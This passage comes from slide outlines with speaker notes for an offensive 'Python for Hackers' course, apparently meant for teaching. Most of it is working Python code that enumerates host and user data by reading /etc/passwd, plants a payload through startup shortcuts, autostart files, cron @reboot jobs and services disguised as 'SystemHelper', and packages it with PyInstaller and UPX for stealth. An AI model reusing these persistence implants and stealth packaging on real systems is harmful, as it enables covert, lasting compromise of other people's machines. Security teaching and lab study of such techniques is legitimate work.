│           info = SystemInfo()                              │
│                                                             │
│           # Basic info                                      │
│           info.hostname = socket.gethostname()            │
│           info.os_name = platform.system()                │
│           info.os_version = platform.version()            │
│           info.kernel = platform.release()                │
│           info.arch = platform.machine()                  │
│                                                             │
│           # CPU                                             │
│           info.cpu_count = psutil.cpu_count()             │
│                                                             │
│           # Memory                                          │
│           mem = psutil.virtual_memory()                   │
│           info.memory_total = mem.total                    │
│           info.memory_available = mem.available           │
│                                                             │
│           # Disk                                            │
│           disk = psutil.disk_usage('/')                   │
│           info.disk_usage = {                              │
│               'total': disk.total,                         │
│               'used': disk.used,                           │
│               'free': disk.free,                           │
│               'percent': disk.percent                      │
│           }                                                 │
│                                                             │
│           # Network                                         │
│           info.network_interfaces = self.get_network_info()│
│                                                             │
│           return info                                       │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

**Speaker Notes:**
- Show system information gathering
- Explain psutil usage
- Demonstrate cross-platform

---

#### Slide 4.2.3: User Enumeration
```python
┌─────────────────────────────────────────────────────────────┐
│                    USER ENUMERATION                         │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│   def get_users(self):                                     │
│       users = []                                            │
│                                                             │
│       if self.platform == 'Windows':                       │
│           # Windows users                                   │
│           import win32net                                  │
│           user_info = win32net.NetUserGetInfo(            │
│               None, win32api.GetUserName(), 2             │
│           )                                                 │
│           users.append(UserInfo(                           │
│               username=user_info['name']                   │
│           ))                                                │
│       else:                                                 │
│           # Unix/Linux users                                │
│           with open('/etc/passwd', 'r') as f:             │
│               for line in f:                               │
│                   if line.startswith('#'):                │
│                       continue                              │
│                   parts = line.strip().split(':')         │
│                   if len(parts) >= 7:                     │
│                       users.append(UserInfo(               │
│                           username=parts[0],               │
│                           uid=int(parts[2]),              │
│                           gid=int(parts[3]),              │
│                           home=parts[5],                   │
│                           shell=parts[6]                   │
│                       ))                                    │
│                                                             │
│           # Group memberships                               │
│           with open('/etc/group', 'r') as f:              │
│               for line in f:                               │
│                   parts = line.strip().split(':')         │
│                   if len(parts) >= 4:                     │
│                       group = parts[0]                     │
│                       members = parts[3].split(',')       │
│                       for member in members:              │
│                           for user in users:              │
│                               if user.username == member:│
│                                   user.groups.append(group)│
│                                                             │
│       return users                                          │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

**Speaker Notes:**
- Show cross-platform user enumeration
- Explain /etc/passwd parsing
- Demonstrate group membership

---

### Phase 4.3: Persistence

#### Slide 4.3.1: Persistence Methods
```
┌─────────────────────────────────────────────────────────────┐
│                    PERSISTENCE METHODS                      │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│   Like leaving hidden doors in a building:                │
│                                                             │
│   • Scheduled Task = Door that opens on schedule          │
│   • Startup Script = Door that opens at entry             │
│   • Registry = Hidden switch                               │
│   • Service = Permanent employee                          │
│                                                             │
│   ───────────────────────────────────────────────            │
│                                                             │
│   Methods:                                                  │
│   • Startup Script - All platforms                         │
│   • Cron/Scheduled Task - Linux/Windows                    │
│   • Registry Entry - Windows only                          │
│   • Service - All platforms                                │
│   • Autostart - Linux/Windows                              │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

**Speaker Notes:**
- Use the hidden doors analogy
- Explain each method
- Discuss platform support

---

#### Slide 4.3.2: Startup Script Persistence
```python
┌─────────────────────────────────────────────────────────────┐
│                    STARTUP SCRIPT PERSISTENCE               │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│   def add_startup_script(self):                            │
│       if self.platform == 'Windows':                       │
│           # Windows Startup folder                          │
│           startup_path = os.path.join(                     │
│               os.environ['APPDATA'],                       │
│               'Microsoft', 'Windows',                      │
│               'Start Menu', 'Programs', 'Startup'          │
│           )                                                 │
│                                                             │
│           shortcut_path = os.path.join(                    │
│               startup_path, 'SystemHelper.lnk'            │
│           )                                                 │
│                                                             │
│           import winshell                                   │
│           winshell.CreateShortcut(                         │
│               shortcut_path,                                │
│               target=self.payload_path                     │
│           )                                                 │
│                                                             │
│       else:                                                 │
│           # Linux: .desktop file                            │
│           desktop_path = os.path.join(                     │
│               os.path.expanduser('~'),                     │
│               '.config', 'autostart',                      │
│               'system-helper.desktop'                     │
│           )                                                 │
│                                                             │
│           content = f"""                                    │
│           [Desktop Entry]                                   │
│           Type=Application                                  │
│           Exec={self.payload_path}                         │
│           Hidden=false                                      │
│           X-GNOME-Autostart-enabled=true                   │
│           Name=System Helper                                │
│           """                                               │
│                                                             │
│           with open(desktop_path, 'w') as f:              │
│               f.write(content)                             │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

**Speaker Notes:**
- Show cross-platform startup persistence
- Explain Windows and Linux implementations
- Discuss detection methods

---

#### Slide 4.3.3: Cron Persistence
```python
┌─────────────────────────────────────────────────────────────┐
│                    CRON PERSISTENCE                         │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│   def add_cron_job(self, schedule='@reboot'):              │
│       # Get current crontab                                 │
│       current_cron = self._run_command('crontab -l')      │
│                                                             │
│       # Build cron entry                                    │
│       cron_entry = f"{schedule} {self.payload_path} >     │
│                     /dev/null 2>&1"                        │
│                                                             │
│       # Check if already exists                             │
│       if cron_entry in current_cron:                       │
│           return True                                       │
│                                                             │
│       # Add to crontab                                      │
│       new_cron = current_cron + "\n" + cron_entry + "\n"  │
│                                                             │
│       # Install                                            │
│       process = subprocess.Popen(                          │
│           ['crontab', '-'],                                │
│           stdin=subprocess.PIPE                            │
│       )                                                    │
│       process.communicate(new_cron.encode())              │
│                                                             │
│       return True                                           │
│                                                             │
│   # Common schedules:                                       │
│   # @reboot - Run at boot                                   │
│   # @daily - Run daily                                      │
│   # @hourly - Run hourly                                    │
│   # * * * * * - Run every minute                            │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

**Speaker Notes:**
- Show cron persistence
- Explain schedule formats
- Discuss detection

---

#### Slide 4.3.4: Service Persistence
```python
┌─────────────────────────────────────────────────────────────┐
│                    SERVICE PERSISTENCE                      │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│   def add_service(self, service_name='SystemHelper'):      │
│       if self.platform == 'Windows':                       │
│           # Windows service                                 │
│           command = (                                      │
│               f'sc create "{service_name}" '               │
│               f'binPath= "{self.payload_path}" '           │
│               f'start= auto'                               │
│           )                                                 │
│           self._run_command(command)                       │
│                                                             │
│       else:                                                 │
│           # Linux systemd service                           │
│           service_path = (                                 │
│               f'/etc/systemd/system/{service_name}.service'│
│           )                                                 │
│                                                             │
│           content = f"""                                    │
│           [Unit]                                            │
│           Description=System Helper Service                │
│           After=network.target                             │
│                                                             │
│           [Service]                                         │
│           Type=simple                                       │
│           ExecStart={self.payload_path}                    │
│           Restart=always                                    │
│           RestartSec=30                                     │
│                                                             │
│           [Install]                                         │
│           WantedBy=multi-user.target                       │
│           """                                               │
│                                                             │
│           with open(service_path, 'w') as f:              │
│               f.write(content)                             │
│                                                             │
│           # Enable and start                                │
│           self._run_command('systemctl daemon-reload')     │
│           self._run_command(f'systemctl enable {service_name}')│
│           self._run_command(f'systemctl start {service_name}')│
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

**Speaker Notes:**
- Show cross-platform service persistence
- Explain Windows and Linux differences
- Discuss stealth considerations

---

### Phase 4.4: Packaging & Deployment

#### Slide 4.4.1: Packaging Concept
```
┌─────────────────────────────────────────────────────────────┐
│                    PACKAGING CONCEPT                        │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│   Like preparing a covert operation package:              │
│                                                             │
│   • Python Script = Mission plan (readable)               │
│   • Packaged Executable = Locked, sealed envelope         │
│   • Dependencies = Equipment needed                        │
│   • Deployment = Delivering the package                    │
│                                                             │
│   ───────────────────────────────────────────────            │
│                                                             │
│   Why we package:                                           │
│   • No Python required on target                           │
│   • Code protection (obfuscated)                           │
│   • Single file deployment                                 │
│   • Stealth (appears as legitimate binary)                 │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

**Speaker Notes:**
- Use the covert operation analogy
- Explain packaging benefits
- Discuss stealth considerations

---

#### Slide 4.4.2: PyInstaller
```bash
┌─────────────────────────────────────────────────────────────┐
│                    PYINSTALLER                              │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│   # Install                                                 │
│   pip install pyinstaller                                   │
│                                                             │
│   # Basic packaging                                         │
│   pyinstaller --onefile script.py                          │
│                                                             │
│   # With options                                            │
│   pyinstaller --onefile \                                   │
│                --windowed \                                 │
│                --name AppName \                             │
│                --icon app.ico \                             │
│                script.py                                    │
│                                                             │
│   # Spec file for advanced control                          │
│   pyinstaller --specpath ./specs script.py                 │
│   # Edit the spec file, then:                              │
│   pyinstaller script.spec                                   │
│                                                             │
│   # Excluding modules                                       │
│   pyinstaller --onefile \                                   │
│                --exclude tkinter \                          │
│                --exclude test \                             │
│                script.py                                    │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

**Speaker Notes:**
- Show PyInstaller installation
- Demonstrate basic and advanced usage
- Explain optimization options

---

#### Slide 4.4.3: Packaging Code
```python
┌─────────────────────────────────────────────────────────────┐
│                    PACKAGING CODE                           │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│   class PackageBuilder:                                     │
│       def build_pyinstaller(self, script_path, config):    │
│           output_name = config.get('name',                 │
│               os.path.basename(script_path).replace('.py',''))│
│                                                             │
│           cmd = [                                           │
│               'pyinstaller',                                │
│               '--onefile',                                  │
│               '--distpath', self.dist_dir,                 │
│               '--workpath', self.build_dir,                │
│               '--name', output_name                        │
│           ]                                                 │
│                                                             │
│           if not config.get('console', True):             │
│               cmd.append('--windowed')                     │
│                                                             │
│           if config.get('icon'):                           │
│               cmd.extend(['--icon', config['icon']])       │
│                                                             │
│           if config.get('hidden_imports'):                 │
│               for imp in config['hidden_imports']:         │
│                   cmd.extend(['--hidden-import', imp])    │
│                                                             │
│           cmd.append(script_path)                          │
│                                                             │
│           subprocess.run(cmd, check=True)                  │
│                                                             │
│           return os.path.join(self.dist_dir, output_name) │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

**Speaker Notes:**
- Show packaging automation
- Explain configuration options
- Demonstrate error handling

---

#### Slide 4.4.4: UPX Compression
```bash
┌─────────────────────────────────────────────────────────────┐
│                    UPX COMPRESSION                          │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│   # Install UPX                                             │
│   sudo apt install upx          # Linux                   │
│   brew install upx               # macOS                   │
│   # Download for Windows                                     │
│                                                             │
│   # Usage with PyInstaller                                   │
│   pyinstaller --onefile --upx-dir /usr/bin script.py      │
│                                                             │
│   # Or compress after building                              │
│   upx --best --brute output.exe                            │
│                                                             │
│   # Results:                                                │
│   # Original size: 8.5 MB                                  │
│   # After UPX: 3.2 MB (-62%)                              │
│                                                             │
│   # Detection considerations:                               │
│   # UPX compression can be a detection signature          │
│   # Use with caution in stealth operations                │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

**Speaker Notes:**
- Show UPX compression
- Explain size reduction
- Discuss detection trade-offs

---

## Teaching Resources & Notes

### Instructor Notes

1. **Delivery Format**
   - 30-day series: 2-hour sessions daily
   - 5-day intensive: 6-hour sessions daily
   - Self-paced: Provide all materials at once

2. **Prerequisites Check**
   - Basic Python knowledge
   - Command line familiarity
   - Fundamental networking concepts

3. **Lab Requirements**
   - VirtualBox/VMware with VMs
   - Internet access for package installation
   - Minimum 8GB RAM, 50GB storage

4. **Key Teaching Points**
   - Always emphasize ethics and legality
   - Show real-world applications
   - Encourage hands-on practice
   - Use the analogies provided

5. **Assessment Methods**
   - Code-along exercises
   - CTF-style challenges
   - Custom tool building
   - Practical scenarios

### Recommended Structure

| Session | Duration | Topics |
|---------|----------|--------|
| Morning | 2 hours | New concepts and code walkthrough |
| Break | 15 min | Q&A and troubleshooting |
| Afternoon | 2 hours | Hands-on labs and challenges |
| Wrap-up | 30 min | Review and next steps |

### Lab Setup Check

```bash
# Quick lab verification
cd ~/hacking-toolkit
python3 verify.py

# Expected output:
✓ Python 3.10+
✓ All packages found
✓ All directories exist
✓ Configuration file
✅ Verification complete
```

---

## End of Slide Deck Outlines

### Additional Resources

| Resource | Description |
|----------|-------------|
| Part 0: Introduction | Series overview and setup |
| Appendix A: API Reference | Complete class/method docs |
| Appendix B: Lab Setup Guide | Installation and configuration |
| Appendix C: Security Best Practices | OPSEC and ethics |
| Primer 1: Getting Started | First 30 minutes |
| Primer 2: Essential Commands | Quick reference |

---

*These slide outlines provide a comprehensive teaching structure for the entire Python for Hackers series. Each slide includes the visual content, speaker notes, and code examples needed to deliver an engaging, effective course.*

---

**[SLIDE OUTLINES COMPLETE]**
